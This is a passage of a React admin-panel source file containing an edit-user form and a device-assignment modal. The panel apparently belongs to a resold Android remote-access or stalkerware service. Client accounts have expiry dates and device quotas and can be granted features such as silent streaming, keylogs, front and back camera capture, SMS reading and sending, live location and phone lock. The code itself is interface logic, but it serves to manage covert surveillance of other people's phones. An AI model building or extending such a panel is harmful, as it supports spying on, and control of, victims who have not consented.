                                </div>
                            </div>

                            <div>
                                <label className="block text-sm font-medium mb-1">Expiration Date</label>
                                <input
                                    type="date"
                                    value={formData.expiresAt}
                                    onChange={e => setFormData({ ...formData, expiresAt: e.target.value })}
                                    className="input"
                                />
                            </div>

                            <div className="flex items-center gap-2">
                                <input
                                    type="checkbox"
                                    id="editIsActive"
                                    checked={formData.isActive}
                                    onChange={e => setFormData({ ...formData, isActive: e.target.checked })}
                                    className="w-4 h-4 rounded"
                                    disabled={selectedUser.id === currentUser?.id}
                                />
                                <label htmlFor="editIsActive" className="text-sm">Active account</label>
                            </div>

                            {formData.role === 'client' && (
                                <div>
                                    <div className="flex items-center justify-between mb-3">
                                        <label className="block text-sm font-bold text-[var(--text-primary)]">Feature Permissions</label>
                                        <div className="flex gap-2">
                                            <button type="button" onClick={selectAllPermissions} className="text-xs px-2 py-1 rounded bg-[var(--aurora-violet)]/10 text-[var(--aurora-violet)] hover:bg-[var(--aurora-violet)]/20">
                                                Enable All
                                            </button>
                                            <button type="button" onClick={clearAllPermissions} className="text-xs px-2 py-1 rounded bg-gray-100 text-gray-600 hover:bg-gray-200">
                                                Disable All
                                            </button>
                                        </div>
                                    </div>

                                    {/* Tab Navigation */}
                                    <div className="flex gap-1 p-1 rounded-xl bg-[var(--bg-subtle)] border border-[var(--border-light)] mb-3">
                                        <button
                                            type="button"
                                            onClick={() => setPermissionsTab('commands')}
                                            className={`flex-1 flex items-center justify-center gap-1.5 px-3 py-2 rounded-lg font-semibold text-xs transition-all ${permissionsTab === 'commands'
                                                    ? 'bg-white text-[var(--text-primary)] shadow-md'
                                                    : 'text-[var(--text-muted)] hover:text-[var(--text-secondary)]'
                                                }`}
                                        >
                                            <Command className="w-3.5 h-3.5" />
                                            Quick Commands
                                        </button>
                                        <button
                                            type="button"
                                            onClick={() => setPermissionsTab('data')}
                                            className={`flex-1 flex items-center justify-center gap-1.5 px-3 py-2 rounded-lg font-semibold text-xs transition-all ${permissionsTab === 'data'
                                                    ? 'bg-white text-[var(--text-primary)] shadow-md'
                                                    : 'text-[var(--text-muted)] hover:text-[var(--text-secondary)]'
                                                }`}
                                        >
                                            <Image className="w-3.5 h-3.5" />
                                            Device Data
                                        </button>
                                    </div>

                                    {/* Permission configurations */}
                                    {(() => {
                                        const permConfig: Record<string, { icon: React.ComponentType<any>; gradient: string; category: 'commands' | 'data' }> = {
                                            // Quick Commands
                                            'screenshot': { icon: Monitor, gradient: 'from-blue-500 to-cyan-400', category: 'commands' },
                                            'camera_front': { icon: Camera, gradient: 'from-purple-500 to-pink-400', category: 'commands' },
                                            'camera_back': { icon: Camera, gradient: 'from-orange-500 to-amber-400', category: 'commands' },
                                            'location_live': { icon: MapPin, gradient: 'from-emerald-500 to-teal-400', category: 'commands' },
                                            'sms_sync': { icon: MessageSquare, gradient: 'from-pink-500 to-rose-400', category: 'commands' },
                                            'sms_send': { icon: Send, gradient: 'from-green-500 to-emerald-400', category: 'commands' },
                                            'calls_sync': { icon: Phone, gradient: 'from-cyan-500 to-blue-400', category: 'commands' },
                                            'contacts_sync': { icon: Users, gradient: 'from-indigo-500 to-purple-400', category: 'commands' },
                                            'commands': { icon: Command, gradient: 'from-indigo-500 to-purple-400', category: 'commands' },
                                            // Device Data
                                            'stream': { icon: Video, gradient: 'from-red-500 to-rose-400', category: 'data' },
                                            'stream_silent': { icon: Monitor, gradient: 'from-violet-500 to-purple-400', category: 'data' },
                                            'livestream': { icon: Video, gradient: 'from-red-500 to-rose-400', category: 'data' },
                                            'stream_video': { icon: Video, gradient: 'from-red-500 to-rose-400', category: 'data' },
                                            'stream_audio': { icon: Mic, gradient: 'from-purple-500 to-pink-400', category: 'data' },
                                            'stream_screen': { icon: Monitor, gradient: 'from-blue-500 to-cyan-400', category: 'data' },
                                            'stream_full': { icon: Video, gradient: 'from-red-600 to-rose-500', category: 'data' },
                                            'recordings': { icon: Mic, gradient: 'from-amber-500 to-yellow-400', category: 'data' },
                                            'sms': { icon: MessageSquare, gradient: 'from-blue-500 to-cyan-400', category: 'data' },
                                            'calls': { icon: Phone, gradient: 'from-emerald-500 to-teal-400', category: 'data' },
                                            'contacts': { icon: Users, gradient: 'from-purple-500 to-pink-400', category: 'data' },
                                            'keylogs': { icon: Keyboard, gradient: 'from-orange-500 to-amber-400', category: 'data' },
                                            'phone_lock': { icon: Lock, gradient: 'from-red-600 to-rose-500', category: 'data' },
                                            'notifications': { icon: Bell, gradient: 'from-pink-500 to-rose-400', category: 'data' },
                                            'gallery': { icon: Image, gradient: 'from-cyan-500 to-blue-400', category: 'data' },
                                            'photos': { icon: Image, gradient: 'from-cyan-500 to-blue-400', category: 'data' },
                                            'location': { icon: MapPin, gradient: 'from-yellow-500 to-orange-400', category: 'data' },
                                            'files': { icon: FolderOpen, gradient: 'from-indigo-500 to-purple-400', category: 'data' },
                                            'settings': { icon: Settings, gradient: 'from-slate-600 to-zinc-500', category: 'data' },
                                            'logs': { icon: Terminal, gradient: 'from-slate-500 to-gray-400', category: 'data' },
                                            'chat': { icon: MessageCircle, gradient: 'from-green-500 to-emerald-400', category: 'data' },
                                            'apps': { icon: Smartphone, gradient: 'from-slate-600 to-zinc-500', category: 'data' },
                                        };

                                        const filteredPerms = permissions.filter(perm => {
                                            const config = permConfig[perm.code];
                                            return config?.category === permissionsTab;
                                        });

                                        return (
                                            <div className="grid grid-cols-3 gap-2 max-h-[300px] overflow-y-auto pr-1">
                                                {filteredPerms.map(perm => {
                                                    const isEnabled = formData.permissions.includes(perm.code);
                                                    const config = permConfig[perm.code] || { icon: Zap, gradient: 'from-gray-500 to-slate-400', category: 'data' };
                                                    const Icon = config.icon;

                                                    return (
                                                        <button
                                                            key={perm.code}
                                                            type="button"
                                                            onClick={() => togglePermission(perm.code)}
                                                            className={`relative p-3 rounded-xl border-2 transition-all flex flex-col items-center gap-2 text-center ${isEnabled
                                                                    ? 'bg-white border-[var(--aurora-violet)] shadow-md'
                                                                    : 'bg-[var(--bg-subtle)] border-transparent opacity-60 hover:opacity-100'
                                                                }`}
                                                        >
                                                            {isEnabled && (
                                                                <div className="absolute top-1 right-1 w-5 h-5 rounded-full bg-[var(--aurora-violet)] flex items-center justify-center">
                                                                    <Check className="w-3 h-3 text-white" />
                                                                </div>
                                                            )}
                                                            <div className={`w-10 h-10 rounded-xl bg-gradient-to-br ${config.gradient} flex items-center justify-center shadow-lg ${isEnabled ? '' : 'grayscale opacity-50'
                                                                }`}>
                                                                <Icon className="w-5 h-5 text-white" />
                                                            </div>
                                                            <span className={`text-xs font-semibold leading-tight ${isEnabled ? 'text-[var(--text-primary)]' : 'text-[var(--text-muted)]'
                                                                }`}>
                                                                {perm.name}
                                                            </span>
                                                        </button>
                                                    );
                                                })}
                                            </div>
                                        );
                                    })()}

                                    <p className="text-xs text-[var(--text-muted)] mt-3 text-center">
                                        {formData.permissions.length} of {permissions.length} features enabled
                                    </p>
                                </div>
                            )}

                            <div className="flex gap-3 pt-4">
                                <button
                                    type="button"
                                    onClick={() => { setShowEditModal(false); setSelectedUser(null); }}
                                    className="flex-1 py-3 rounded-xl border border-[var(--border-light)] font-medium"
                                >
                                    Cancel
                                </button>
                                <button
                                    type="submit"
                                    disabled={formLoading}
                                    className="flex-1 py-3 rounded-xl bg-gradient-to-r from-[var(--aurora-violet)] to-[var(--aurora-purple)] text-white font-medium disabled:opacity-50"
                                >
                                    {formLoading ? <Loader2 className="w-5 h-5 animate-spin mx-auto" /> : 'Save Changes'}
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            )}

            {/* Devices Modal */}
            {showDevicesModal && selectedUser && (
                <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
                    <div className="bg-white rounded-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto">
                        <div className="p-6 border-b border-[var(--border-light)]">
                            <div className="flex items-center justify-between">
                                <h2 className="text-xl font-bold text-[var(--text-primary)]">
                                    Devices for {selectedUser.username}
                                </h2>
                                <button onClick={() => { setShowDevicesModal(false); setSelectedUser(null); }} className="p-2 hover:bg-[var(--bg-subtle)] rounded-lg">
                                    <X className="w-5 h-5" />
                                </button>
                            </div>
                        </div>

                        <div className="p-6 space-y-4">
                            {/* Assigned Devices */}
                            <div>
                                <h3 className="text-sm font-semibold text-[var(--text-muted)] mb-2">
                                    Assigned Devices ({userDevices.length}/{selectedUser.maxDevices})
                                </h3>
                                {userDevices.length === 0 ? (
                                    <p className="text-sm text-[var(--text-muted)] p-3 bg-[var(--bg-subtle)] rounded-lg">
                                        No devices assigned
                                    </p>
                                ) : (
                                    <div className="space-y-2">
                                        {userDevices.map(device => (
                                            <div key={device.id} className="flex items-center justify-between p-3 bg-[var(--bg-subtle)] rounded-lg">
                                                <div className="flex items-center gap-3">
                                                    <Smartphone className={`w-5 h-5 ${device.isOnline ? 'text-emerald-500' : 'text-[var(--text-muted)]'}`} />
                                                    <div>
                                                        <p className="font-medium text-sm">{device.model || device.deviceId}</p>
                                                        <p className="text-xs text-[var(--text-muted)]">{device.manufacturer}</p>
                                                    </div>
                                                </div>
                                                <button
                                                    onClick={() => handleUnassignDevice(device.id)}
                                                    className="p-2 hover:bg-red-100 text-red-500 rounded-lg"
                                                    title="Unassign"
                                                >
                                                    <X className="w-4 h-4" />
                                                </button>
                                            </div>
                                        ))}
                                    </div>
                                )}
                            </div>

                            {/* Unassigned Devices */}
                            {unassignedDevices.length > 0 && (
                                <div>
                                    <h3 className="text-sm font-semibold text-[var(--text-muted)] mb-2">
                                        Available Devices ({unassignedDevices.length})
                                    </h3>
                                    <div className="space-y-2">
                                        {unassignedDevices.map(device => (
                                            <div key={device.id} className="flex items-center justify-between p-3 border border-dashed border-[var(--border-light)] rounded-lg">
                                                <div className="flex items-center gap-3">
                                                    <Smartphone className="w-5 h-5 text-[var(--text-muted)]" />
                                                    <div>
                                                        <p className="font-medium text-sm">{device.model || device.deviceId}</p>
                                                        <p className="text-xs text-[var(--text-muted)]">{device.manufacturer}</p>
                                                    </div>
                                                </div>
                                                <button
                                                    onClick={() => handleAssignDevice(device.id)}
                                                    disabled={userDevices.length >= selectedUser.maxDevices}
                                                    className="px-3 py-1 bg-[var(--aurora-violet)] text-white text-sm rounded-lg disabled:opacity-50"
                                                >
                                                    Assign
                                                </button>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
